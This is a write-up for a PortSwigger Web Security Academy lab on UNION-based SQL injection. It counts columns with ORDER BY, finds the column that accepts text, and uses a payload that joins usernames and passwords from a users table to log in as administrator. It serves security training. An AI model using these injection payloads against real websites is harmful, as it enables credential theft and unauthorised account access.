## LAB DESCRIPTION

<img width="911" height="599" alt="image" src="https://github.com/user-attachments/assets/f399be97-c485-497e-b480-c4602942fe01" />

## SOLUTION

---------------------------------------------

- Reference: https://portswigger.net/web-security/sql-injection
- SQL Injection Cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------

The vulnerable parameter is the `category` used to filter products on the main shop page. This value is concatenated into a `WHERE` clause in a SQL query without parameterization, so a crafted `UNION SELECT` lets us inject our own query and its results rendered with the products.

---------------------------------------------------
> `+ORDER+BY+1--`
<img width="1698" height="785" alt="image" src="https://github.com/user-attachments/assets/34b77036-e026-47e2-9d15-86ea74930d9d" />

> `+ORDER+BY+2--`
<img width="1696" height="782" alt="image" src="https://github.com/user-attachments/assets/92dd4f6c-5f82-4deb-b5da-a5c9124e2e2f" />

> `+ORDER+BY+3--`
<img width="1691" height="784" alt="image" src="https://github.com/user-attachments/assets/e99da0d4-b8cc-4b8c-befd-3cf8f312a6b6" />

The query results indicate that there are only two columns that are being used by the SQL query.

---------------------------------------------------
**Check for field/column type**

Intercept a request that filters by `category` and send it to Repeater.
Test a UNION probe to locate the text column.

PAYLOAD: `'+UNION+SELECT+NULL,NULL--`
<img width="1691" height="779" alt="image" src="https://github.com/user-attachments/assets/3cae493a-0109-45d7-b63a-4094d80e6892" />

> Check for string type.
> 
> PAYLOAD: `'+UNION+SELECT+'abc','def'--`
<img width="1691" height="449" alt="image" src="https://github.com/user-attachments/assets/2aa1c6a0-281c-4ae8-a3d1-cfafa946df4a" />

Both the columns are not string compatible.


> PAYLOAD: `'+UNION+SELECT+'abc',NULL--`
<img width="1690" height="422" alt="image" src="https://github.com/user-attachments/assets/a8d66a20-b703-4b24-80cc-ec425ff5ade9" />

>First column is not string-type.

> PAYLOAD: `'+UNION+SELECT+NULL,'def'--`
<img width="1686" height="785" alt="image" src="https://github.com/user-attachments/assets/6f1d7497-fdc0-49ed-a461-5f90eee3fa1b" />

>As the page was rendered, hence the Second column is a string-type.

> PAYLOAD: `'+UNION+SELECT+1,'def'--`
<img width="1689" height="792" alt="image" src="https://github.com/user-attachments/assets/beead427-6080-4bbc-96e3-e9bb06c2a498" />

----------------------------------------------

For this lab, the underlying query returns two columns total, but only the second column is text-compatible; 
>It can be determined that:
>  - The query returns 2 columns.
>  - Column 1 is a non-string type; Column 2 is a string column that is rendered.

---------------------------------------------

Because only one visible string column is available in the UNION, we cannot place `username` and `password` in the separate column.

Instead, we can concatenate them into a single string with a separator (such as `~`).

Crafted PAYLOAD: `'+UNION+SELECT+NULL,username+||'~'||+password+FROM+users--`

Conceptually, the backend query becomes: 

```sql
SELECT <num_col>, <text_col> FROM products WHERE category='Lifestyle' UNION SELECT NULL, username||'~'||password FROM users--
```

<img width="1933" height="1152" alt="image" src="https://github.com/user-attachments/assets/d15dc8bb-d67e-4373-87f9-03b28c92e9c1" />

----------------------------------------------------

Navigate to the login page and authenticate using:
- Usename: `administrator`
- Password: retrieved from the concatenated output
<img width="766" height="361" alt="image" src="https://github.com/user-attachments/assets/b257f6b5-b8d4-43d7-b63f-6e472c3036d1" />


<img width="1315" height="648" alt="image" src="https://github.com/user-attachments/assets/36d3fd04-4af5-40a6-a065-27077ad2031c" />

A successful login as `administrator` completes the lab.
